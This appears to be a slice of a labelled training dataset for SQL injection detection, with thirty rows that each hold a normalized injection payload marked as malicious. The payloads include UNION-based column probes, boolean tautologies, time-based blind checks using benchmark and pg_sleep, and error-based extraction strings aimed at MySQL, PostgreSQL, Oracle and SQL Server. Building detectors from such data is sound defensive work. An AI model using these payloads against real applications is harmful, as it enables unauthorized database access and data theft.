row_index,payload_norm,label,sqli_type_hint
10770,"1' ) where 5799 = 5799 union all select null,null,null,null,null--",1,
10771,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""zlwb"" = ""zlwb",1,
10772,"1"" ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""djrh"" = ""djrh",1,
10773,-2129' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'eutm' like 'eutm,1,
10774,"1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'ogwd' like 'ogwd",1,
10775,"-2784' ) ) union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",1,
10776,"-8094 ) or elt ( 1032 = 1032,3623 ) and ( 4569 = 4569",1,
10777,"-2909'|| ( select 'qfeq' where 7062 = 7062 union all select 7062,7062,7062,7062,7062,7062--",1,
10778,-3520%' or 8571 = 8571--,1,
10779,"1"" where 1618 = 1618 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
10780,1' ) where 7478 = 7478,1,
10781,-8080' ) ) order by 1#,1,
10782,"-2798'+ ( select 'emui' where 9565 = 9565 union all select 9565,9565,9565,9565--",1,
10783,"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",1,
10784,1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ),1,
10785,"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'bgdp' = 'bgdp",1,
10786,1'|| ( select 'svnn' from dual where 8710 = 8710,1,
10787,end and ( 'jzlr' = 'jzlr,1,
10788,"-4558"" or ( 3965 = 3933 ) *3933 and ""hmdb"" like ""hmdb",1,
10789,"1', ( select ( case when ( 3888 = 3888 ) then ( select count ( * ) from generate_series ( 1,5000000 ) ) else 1/ ( select 0 ) end ) )",1,
10790,1' ) as dpmh where 5281 = 5281 and 2006 = 2006,1,
10791,1' ) where 3767 = 3767 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
10792,"1"" ) ) as nbdc where 4444 = 4444 union all select null,null--",1,
10793,"select * from generate_series ( 2673,2673,case when ( 2673 = 1468 ) then 1 else 0 end ) limit 1--",1,
10794,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'seyd' = 'seyd",1,
10795,"1 where 1186 = 1186 union all select null,null,null,null,null,null,null#",1,
10796,"-1816"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""dztr"" like ""dztr",1,
10797,"-5425 where 5933 = 5933 union all select 5933,5933,5933--",1,
10798,1'+ ( select 'jkgf' where 7487 = 7487,1,
10799,select ( case when ( 1082 = 6755 ) then 1082 else 1082* ( select 1082 from mysql.db ) end ) #,1,
